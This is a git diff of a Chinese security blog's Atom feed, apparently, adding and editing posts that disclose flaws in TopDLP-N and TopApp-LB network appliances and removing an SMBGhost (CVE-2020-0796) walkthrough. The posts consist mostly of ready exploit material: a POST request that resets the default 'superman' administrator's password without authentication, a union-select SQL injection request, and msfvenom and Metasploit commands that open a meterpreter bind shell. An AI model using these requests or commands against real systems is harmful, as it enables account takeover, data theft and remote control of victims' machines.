@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://yejinpoxiao.xyz/"/>
-  <updated>2020-09-18T02:28:57.797Z</updated>
+  <updated>2020-09-18T16:47:32.965Z</updated>
   <id>https://yejinpoxiao.xyz/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>天X信数据防泄漏系统越权修改密码漏洞</title>
+    <link href="https://yejinpoxiao.xyz/2020/09/19/%E5%A4%A9X%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"/>
+    <id>https://yejinpoxiao.xyz/2020/09/19/%E5%A4%A9X%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/</id>
+    <published>2020-09-18T16:37:04.339Z</published>
+    <updated>2020-09-18T16:47:32.965Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>天X信网络数据防泄漏系统（TopDLP-N）以深度内容识别技术为核心，采用独有的网络抓包技术、数据深度分析、协议内容解析、文件内容还原等技术、综合运用各种先进的检测算法，对单位内部用户邮件客户端（SMTP）、浏览器（HTTP/S）、FTP客户端（FTP）、网络共享（SMB）等途径传输的数据进行解析和内容提取，识别敏感数据，依据预先定义策略执行防护措施，进而达到敏感数据防护的目的。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd 接口未授权访问,造成直接修改任意用户密码。</p><p>默认superman账户uid为1。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /?module=auth_user&amp;action=mod_edit_pwd </span><br><span class="line"><span class="attribute">Cookie</span>: username=superman;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;天X信网络数据防泄漏系统（TopDLP-N）以深度内容识别技术为核心，采用独有的网络抓包技术、数据深度分析、协议内容解析、文
+      
+    
+    </summary>
+    
+    
+      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
+    
+    
+      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>深x服某PN存在任意重置绑定手机号漏洞</title>
@@ -252,19 +278,19 @@
   </entry>
   
   <entry>
-    <title>天融信TopApp-LB 负载均衡系统sql注入</title>
-    <link href="https://yejinpoxiao.xyz/2020/09/11/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/"/>
-    <id>https://yejinpoxiao.xyz/2020/09/11/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/</id>
+    <title>天X信TopApp-LB 负载均衡系统sql注入</title>
+    <link href="https://yejinpoxiao.xyz/2020/09/11/%E5%A4%A9X%E4%BF%A1TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/"/>
+    <id>https://yejinpoxiao.xyz/2020/09/11/%E5%A4%A9X%E4%BF%A1TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/</id>
     <published>2020-09-11T10:57:40.855Z</published>
-    <updated>2020-09-11T11:28:37.247Z</updated>
+    <updated>2020-09-18T16:47:17.657Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>天融信负载均衡系统TopApp为用户提供高可靠的数据中心解决方案，包括单数据中心的链路负载均衡、服务器负载均衡解决方案，以及多数据中心的全局负载均衡解决方案。TopApp集成了压缩、缓存、SSL卸载等网络优化技术来加速业务系统交付的整个过程，提升业务系统处理效率；同时结合Web应用防火墙、DNS防火墙、DDOS攻击防护及漏洞扫描等技术手段形成全方位的网络安全防护，为用户业务系统的安全保驾护航。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/acc/clsf/report/datasource.php</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="attribute">Host:</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept</span>: text/javascript, text/html, application/xml, text/xml, */*</span><br><span class="line"></span><br><span class="line"><span class="attribute">X-Prototype-Version</span>: 1.6.0.3</span><br><span class="line"></span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"></span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: same-origin</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: cors</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: empty</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Length</span>: 201</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=@ ......</span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>天X信负载均衡系统TopApp为用户提高可靠的数据中心解决方案，包括单数据中心的链路负载均衡、服务器负载均衡解决方案，以及多数据中心的全局负载均衡解决方案。TopApp集成了压缩、缓存、SSL卸载等网络优化技术来加速业务系统交付的整个过程，提升业务系统处理效率；同时结合Web应用防火墙、DNS防火墙、DDOS攻击防护及漏洞扫描等技术手段形成全方位的网络安全防护，为用户业务系统的安全保驾护航。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/acc/clsf/report/datasource.php</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="attribute">Host:</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept</span>: text/javascript, text/html, application/xml, text/xml, */*</span><br><span class="line"></span><br><span class="line"><span class="attribute">X-Prototype-Version</span>: 1.6.0.3</span><br><span class="line"></span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"></span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: same-origin</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: cors</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: empty</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Length</span>: 201</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=@ ......</span><br></pre></td></tr></table></figure>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;天融信负载均衡系统TopApp为用户提供高可靠的数据中心解决方案，包括单数据中心的链路负载均衡、服务器负载均衡解决方案，以及
+        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;天X信负载均衡系统TopApp为用户提高可靠的数据中心解决方案，包括单数据中心的链路负载均衡、服务器负载均衡解决方案，以及多
       
     
     </summary>
@@ -511,33 +537,6 @@
     
     
       <category term="笔记" scheme="https://yejinpoxiao.xyz/tags/%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>永恒之黑(cve-2020-0796)配合msf获取shell</title>
-    <link href="https://yejinpoxiao.xyz/2020/06/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91(cve-2020-0796)%E9%85%8D%E5%90%88msf%E8%8E%B7%E5%8F%96shell/"/>
-    <id>https://yejinpoxiao.xyz/2020/06/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91(cve-2020-0796)%E9%85%8D%E5%90%88msf%E8%8E%B7%E5%8F%96shell/</id>
-    <published>2020-06-04T07:05:29.171Z</published>
-    <updated>2020-07-08T09:49:23.561Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>   今天看到tools上的cve-2020-0796复现文章，就此自己搭建一下环境复现，做一下笔记</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10 Version 1903， Windows Server Version 1903(Server Core  installation)，Windows 10 Version 1909， 和Windows Server Version  1909(Server Core installation)受到这个漏洞的影响。不过值得注意的是，引入SMBv3的Windows  8和Windows Server 2012也有可能受到影响。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>GitHub上Fork过来的</p><p><a href="https://github.com/YGnight/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/YGnight/SMBGhost_RCE_PoC</a></p><p>kali集成</p><p>metasploit ：开源安全漏洞检测工具；</p><p>msfvenom ：metasploit的标准payload生成器</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>使用msfvenom生成直连exploit</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=<span class="number">1314</span> -f py -o cve<span class="number">-2020</span><span class="number">-0796.</span>py</span><br></pre></td></tr></table></figure><p><img src="0.png" alt="0"></p><p>将生成的与脚本exploit.py里user_payload进行替换</p><p><img src="1.png" alt="1"></p><p>使用python3运行exploit （版本不要过高，本地复现使用的python3.7.4）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">exploit</span><span class="selector-class">.py</span> <span class="selector-tag">-ip</span> 192<span class="selector-class">.168</span><span class="selector-class">.168</span><span class="selector-class">.130</span></span><br></pre></td></tr></table></figure><p><img src="3.png" alt="3"></p><p>运行metasploit </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload /windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">1314</span></span><br></pre></td></tr></table></figure><p><img src="4.png" alt="4"></p><p>指定目标机，run</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">130</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="5.png" alt="5"></p><p>得到shell</p><p><img src="6.png" alt="6"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;   今天看到tools上的cve-2020-0796复现文章，就此自己搭建一下环境复现，做一下笔记&lt;/p&gt;
-&lt;h2 id=&quot;影响范围&quot;&gt;&lt;
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="提权" scheme="https://yejinpoxiao.xyz/tags/%E6%8F%90%E6%9D%83/"/>
     
   </entry>
   
